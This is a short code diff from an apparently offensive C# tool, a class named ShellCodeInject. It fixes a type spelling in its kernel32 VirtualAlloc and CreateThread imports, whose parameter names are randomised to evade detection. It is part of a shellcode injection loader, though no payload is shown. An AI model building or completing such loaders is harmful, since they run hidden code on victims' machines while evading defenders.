@@ -37,7 +37,7 @@
 			public class ShellCodeInject
 			{
 				[DllImport("kernel32")]
-				private static extern IntPtr VirtualAlloc(Uint32 JWmoIlFhPkGN, UInt32 UzWUXeiqddon, UInt32 szYzablY, UInt32 GXqpQXZYHpUiQ);
+				private static extern IntPtr VirtualAlloc(UInt32 JWmoIlFhPkGN, UInt32 UzWUXeiqddon, UInt32 szYzablY, UInt32 GXqpQXZYHpUiQ);
 				[DllImport("kernel32")]
 				private static extern IntPtr CreateThread(UInt32 cfYPJVtsoTj, UInt32 BzaNozPQLx, IntPtr YcjYxbv, IntPtr FmjdKEI, UInt32 WalIOQWiqTD, ref UInt32 VmRrcdmoX);
 				[DllImport("kernel32")]
